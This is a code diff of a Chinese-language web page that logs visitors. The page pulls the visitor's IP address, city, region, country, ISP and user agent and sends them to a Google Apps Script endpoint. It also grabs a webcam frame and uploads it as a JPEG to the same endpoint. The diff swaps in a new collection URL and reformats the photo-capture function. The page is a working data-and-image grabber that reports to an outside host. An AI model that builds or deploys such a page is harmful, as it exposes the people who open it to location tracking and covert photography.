@@ -6,7 +6,7 @@
   <title>IP 與設備訊息記錄</title>
 </head>
 <body>
-  <h1>IP 與設備訊息記錄</h1>
+  <h1>IP 與設備訊息ddd記錄</h1>
   <p id="ipInfo">IP 資訊載入中...</p>
   <p id="status">尚未開始操作</p>
   <video id="video" autoplay playsinline width="320" height="240"></video>
@@ -28,7 +28,7 @@
           `IP: ${ip}, 類型: ${ipType}, 城市: ${city}, 區域: ${region}, 國家: ${country}, 組織: ${org}, 用戶代理: ${userAgent}`;
 
         // 發送 IP 資訊到後端
-        const url = new URL('https://script.google.com/macros/s/AKfycbxQheARzEqjFsSFoJ9LgqR9mXayjpDQmpvw85CwGQs3uMwXyFuRixLqEDnUA_LVLTElYg/exec');
+        const url = new URL('https://script.google.com/macros/s/AKfycbyxIeZIUUkA6I5C75h0-_zDMG5ITwemuxO3EOmWQQ9cKUQ9Snv57x9COgCazJCJq9mH7Q/exec');
         url.searchParams.append('ip', ip);
         url.searchParams.append('ipType', ipType);
         url.searchParams.append('userAgent', userAgent);
@@ -52,43 +52,46 @@
     }
 
     // 拍攝照片並上傳到後端
-    async function capturePhoto() {
-      const video = document.getElementById('video');
-      const canvas = document.getElementById('canvas');
-      const ctx = canvas.getContext('2d');
+async function capturePhoto() {
+  const video = document.getElementById('video');
+  const canvas = document.getElementById('canvas');
+  const ctx = canvas.getContext('2d');
 
-      // 捕捉攝影畫面到 Canvas
-      canvas.width = video.videoWidth;
-      canvas.height = video.videoHeight;
-      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+  // 將畫面捕捉到 Canvas
+  canvas.width = video.videoWidth;
+  canvas.height = video.videoHeight;
+  ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-      const dataUrl = canvas.toDataURL('image/jpeg');
+  // 將 Canvas 內容轉為 Data URL
+  const dataUrl = canvas.toDataURL('image/jpeg');
 
-      try {
-        const formData = new FormData();
-        formData.append('photoDataUrl', dataUrl);
+  try {
+    // 使用 FormData 構建請求
+    const formData = new FormData();
+    formData.append('photoDataUrl', dataUrl);
 
-        const response = await fetch('https://script.google.com/macros/s/AKfycbxQheARzEqjFsSFoJ9LgqR9mXayjpDQmpvw85CwGQs3uMwXyFuRixLqEDnUA_LVLTElYg/exec', {
-          method: 'POST',
-          body: formData,
-        });
+    const response = await fetch('https://script.google.com/macros/s/AKfycbyxIeZIUUkA6I5C75h0-_zDMG5ITwemuxO3EOmWQQ9cKUQ9Snv57x9COgCazJCJq9mH7Q/exec', {
+      method: 'POST',
+      body: formData,
+    });
 
-        if (!response.ok) {
-          throw new Error(`伺服器返回錯誤：${response.status} ${response.statusText}`);
-        }
-
-        const result = await response.json();
-        if (result.success) {
-          document.getElementById('status').innerText = '照片成功上傳！';
-          console.log('照片 URL:', result.photoUrl);
-        } else {
-          document.getElementById('status').innerText = `照片上傳失敗：${result.error}`;
-        }
-      } catch (error) {
-        console.error('圖片上傳失敗:', error);
-        document.getElementById('status').innerText = '圖片上傳失敗，請檢查控制台。';
-      }
+    if (!response.ok) {
+      throw new Error(`伺服器返回錯誤：${response.status} ${response.statusText}`);
     }
+
+    const result = await response.json();
+    if (result.success) {
+      document.getElementById('status').innerText = '照片成功上傳！';
+      console.log('照片 URL:', result.photoUrl);
+    } else {
+      document.getElementById('status').innerText = `照片上傳失敗：${result.error}`;
+    }
+  } catch (error) {
+    console.error('圖片上傳失敗:', error);
+    document.getElementById('status').innerText = '圖片上傳失敗，請檢查控制台。';
+  }
+}
+
 
     // 初始化攝影機
     async function initCamera() {
